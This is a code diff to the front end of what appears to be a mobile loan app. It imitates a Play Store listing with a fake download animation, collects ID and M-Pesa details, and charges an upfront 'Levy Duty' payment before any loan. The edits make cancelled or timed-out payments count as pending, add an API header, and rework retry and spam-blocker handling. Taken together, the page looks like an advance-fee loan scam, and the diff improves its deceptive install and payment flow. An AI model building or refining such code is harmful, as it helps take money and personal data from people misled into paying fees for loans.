@@ -595,7 +595,9 @@ const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1
 const MAX_POLL_SECONDS = 60;
 
 const SUCCESS_STATUSES = ['ALLOCATED','SUCCESS','COMPLETED','PAID','SUCCESSFUL','TRUE','CONFIRMED'];
-const FAILED_STATUSES = ['FAILED','CANCELLED','CANCELED','REJECTED','EXPIRED','TIMEOUT','DECLINED','FALSE','ABORTED','USER_ABORTED'];
+// Removed CANCELLED and TIMEOUT from hard failures to account for delayed M-Pesa webhooks
+const FAILED_STATUSES = ['FAILED','REJECTED','EXPIRED','DECLINED','FALSE','ABORTED','USER_ABORTED'];
+const PENDING_STATUSES = ['CANCELLED', 'CANCELED', 'TIMEOUT'];
 
 let state = { name:"", id:"", mpesa:"", promo:"", loan:1000, levy:100, term:30, interest:100, total:1100 };
 const amounts = [1000,2000,3000,5000,7500,10000,15000,20000,25000,30000,40000,50000];
@@ -680,7 +682,6 @@ async function fetchWithTimeout(url, opts={}, ms=15000){
     try { 
         return await fetch(url, {...opts, signal:c.signal, cache:'no-store'}); 
     } catch (error) {
-        // Only show offline gate for actual network failures, not CORS or 4xx/5xx
         if (error.name === 'TypeError' && !error.message.includes('Failed to fetch')) {
              document.getElementById('offline-gate').classList.remove('hide');
         }
@@ -693,7 +694,16 @@ async function fetchWithTimeout(url, opts={}, ms=15000){
 async function readJsonSafe(r){ try{ const x = await r.text(); return x ? JSON.parse(x) : null; }catch(e){ return null; } }
 
 function stopPolling(){ if(pollTimer){ clearTimeout(pollTimer); pollTimer = null; } isPolling = false; }
-function resetPayButton(){ isProcessingPayment = false; const b = document.getElementById('btn-pay'); if(b){ b.disabled = false; b.innerText = `Pay ${format(state.levy)} Levy Duty`; } }
+function resetPayButton(){ 
+    isProcessingPayment = false; 
+    localStorage.removeItem('zc_failed_attempts'); // Fix: Clear spam attempts here
+    const b = document.getElementById('btn-pay'); 
+    if(b){ 
+        b.disabled = false; 
+        b.innerText = `Pay ${format(state.levy)} Levy Duty`; 
+        b.style.background = ''; // Reset background color in case it was disabled by spam blocker
+    } 
+}
 
 /* =============== BROWSER DETECTION =============== */
 const _ua = navigator.userAgent || '';
@@ -742,14 +752,12 @@ window.addEventListener('beforeinstallprompt', (e) => {
     e.preventDefault();
     deferredPrompt = e;
     
-    // If the user clicked the button before the prompt was ready, trigger it now
     if (waitingForPrompt) {
         waitingForPrompt = false;
         triggerRealInstall();
     }
 });
 
-// Listen for the actual appinstalled event
 window.addEventListener('appinstalled', () => {
     localStorage.setItem('pwa_installed', '1');
     clearInterval(fakeInterval);
@@ -793,10 +801,7 @@ function setRating(r){
 }
 
 document.getElementById('btn-store-install').addEventListener('click', () => {
-    // 1. Start the fake download immediately so the user gets instant visual feedback
     startFakeDownload();
-
-    // 2. Trigger prompt immediately if ready, or wait for it
     if (deferredPrompt) {
         triggerRealInstall();
     } else {
@@ -812,7 +817,6 @@ function triggerRealInstall() {
             // appinstalled event will handle the UI change
         }
         deferredPrompt = null;
-        // If prompt was cancelled, reset the UI immediately
         if (localStorage.getItem('pwa_installed') !== '1') {
             showInstallState();
         }
@@ -838,8 +842,6 @@ function startFakeDownload() {
             clearInterval(fakeInterval);
             document.getElementById('download-text').classList.add('hide');
             
-            // If app wasn't actually installed by the user accepting the prompt,
-            // reset the UI back to the Install button.
             if (localStorage.getItem('pwa_installed') !== '1') {
                 showInstallState();
             }
@@ -869,27 +871,21 @@ function toggleReviews() {
 
 /* =============== OPEN BUTTON TRICK =============== */
 document.getElementById('btn-open-app').addEventListener('click', async ()=>{
-    
-    // 1. Check if the PWA is installed on Android
     if (_isAndroid && 'getInstalledRelatedApps' in navigator) {
         try {
             const apps = await navigator.getInstalledRelatedApps();
             const pwa = apps.find(a => a.platform === 'webapp');
             
             if (pwa) {
-                // App is installed! Try to launch it.
                 window.location.href = './index.html?source=pwa';
-                return; // Stop here, don't show the prompt
+                return;
             }
         } catch (e) {
             console.log("Check failed", e);
         }
     }
 
-    // 2. Fallback: App is NOT installed (or user is on iPhone)
-    // Do NOT navigate. Just show the prompt right below the buttons.
     const prompt = document.getElementById('installed-prompt');
-    
     prompt.classList.remove('hide');
     
     setTimeout(() => {
@@ -908,7 +904,6 @@ document.getElementById('btn-open-app').addEventListener('click', async ()=>{
 
 function showAppInline(){
     playStoreGate.classList.add('hide');
-    
     splashScreen.classList.remove('hide');
     splashScreen.style.opacity = '1';
     
@@ -1021,7 +1016,6 @@ function buildLoanScreen(){
     const first = state.name.split(' ')[0];
     document.getElementById('greeting-name').innerText = first || 'there';
     
-    // Set the default selected loan to 1000
     state.loan = 1000;
 
     const grid = document.getElementById('amount-grid');
@@ -1030,7 +1024,6 @@ function buildLoanScreen(){
     amounts.forEach(a=>{
         const b = document.createElement('button');
         
-        // Visually dim amounts above 10,000
         if (a > 10000) {
             b.className = `amount-btn relative opacity-50 bg-slate-50 border-slate-200 text-slate-400`;
         } else {
@@ -1100,6 +1093,7 @@ async function processPayment(){
         const res = await fetchWithTimeout(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
             method:'POST',
             headers:{ 
+                'apikey': SUPABASE_KEY, // Added missing apikey header
                 'Authorization':`Bearer ${SUPABASE_KEY}`, 
                 'Content-Type':'application/json' 
             },
@@ -1111,7 +1105,6 @@ async function processPayment(){
             })
         }, 30000);
 
-        // Read the raw text first to catch HTML error pages from Supabase
         const rawText = await res.text();
         let data;
         try { data = JSON.parse(rawText); } catch (e) { data = { error: "Invalid response from server" }; }
@@ -1141,7 +1134,6 @@ async function processPayment(){
         startPolling(txnId);
 
     } catch (err) {
-        // Show the EXACT reason
         console.error("Payment error:", err);
         showFailed();
         document.getElementById('failed-reason').innerText = err.message;
@@ -1161,8 +1153,9 @@ async function checkStatusFromDB(txnId){
             const s = String(row.status || "").toUpperCase();
             if(SUCCESS_STATUSES.includes(s)) return { status:'SUCCESS', raw:s };
             if(FAILED_STATUSES.includes(s)) return { status:'FAILED', raw:s };
+            if(PENDING_STATUSES.includes(s)) return { status:'PENDING', raw:s }; // Return pending explicitly
         }
-        return { status:'PENDING' };
+        return { status:'PENDING', raw: 'UNKNOWN' };
     } catch(e){ return { status:'ERROR' }; }
 }
 
@@ -1176,13 +1169,25 @@ function startPolling(txnId){
             if(attempt === 8) document.getElementById('verify-subtitle').innerText = "Still checking. Enter your M-Pesa PIN if you haven't.";
             if(attempt === 25) document.getElementById('verify-subtitle').innerText = "Taking longer than usual. Don't close the app.";
             if(attempt >= MAX_POLL_SECONDS){ showPending(); return; }
+            
             if(isPolling){ pollTimer = setTimeout(doPoll, 1000); return; }
             isPolling = true;
+            
             try {
                 const result = await checkStatusFromDB(txnId);
+                
                 if(result.status === 'SUCCESS'){ showSuccess(); return; }
+                
+                // If it's pending or cancelled/timed out, DO NOT fail. Keep polling for delayed success.
+                if(result.status === 'PENDING'){
+                    if(PENDING_STATUSES.includes(result.raw)) {
+                        document.getElementById('verify-subtitle').innerText = "Verifying final status with M-Pesa...";
+                    }
+                }
+                
                 if(result.status === 'FAILED'){ showFailed(); return; }
             } finally { isPolling = false; }
+            
             const nextDelay = attempt < 5 ? 1000 : 2000;
             pollTimer = setTimeout(doPoll, nextDelay);
         } catch(e){ pollTimer = setTimeout(doPoll, 2000); }
@@ -1211,7 +1216,11 @@ function showFailed(){
 }
 
 function showPending(){
-    stopPolling();
+    stopPolling(); 
+    isProcessingPayment = false; // Fix: Reset this so user can retry/poll again
+    const b = document.getElementById('btn-pay');
+    if (b) { b.disabled = false; }
+
     document.getElementById('verify-anim').classList.add('hide');
     document.getElementById('failed-anim').classList.add('hide');
     document.getElementById('success-anim').classList.add('hide');
@@ -1319,6 +1328,7 @@ function retryPayment(){
         const existingModal = document.getElementById('spam-prompt-modal');
         if (existingModal) existingModal.remove();
 
+        // Fix: Replaced inline onclick with a unique ID and addEventListener below
         const modalHTML = `
             <div id="spam-prompt-modal" class="fixed inset-0 z-[100000] bg-slate-900/60 backdrop-blur-sm flex items-center justify-center p-6">
                 <div class="spam-modal bg-white rounded-2xl p-6 w-full max-w-sm shadow-2xl">
@@ -1334,7 +1344,7 @@ function retryPayment(){
                             attempt${remaining === 1 ? '' : 's'} remaining.
                         </p>
 
-                        <button onclick="document.getElementById('spam-prompt-modal').remove(); if(typeof onOkCallback === 'function') onOkCallback();" class="native-btn" style="padding: 14px; min-height: 48px; font-size: 15px;">
+                        <button id="spam-modal-ok-btn" class="native-btn" style="padding: 14px; min-height: 48px; font-size: 15px;">
                             OK
                         </button>
                     </div>
@@ -1342,6 +1352,12 @@ function retryPayment(){
             </div>
         `;
         document.body.insertAdjacentHTML('beforeend', modalHTML);
+
+        // Fix: Attach event listener properly
+        document.getElementById('spam-modal-ok-btn').addEventListener('click', () => {
+            document.getElementById('spam-prompt-modal')?.remove();
+            if (typeof onOkCallback === 'function') onOkCallback();
+        });
     }
 
     const originalShowFailed = window.showFailed;
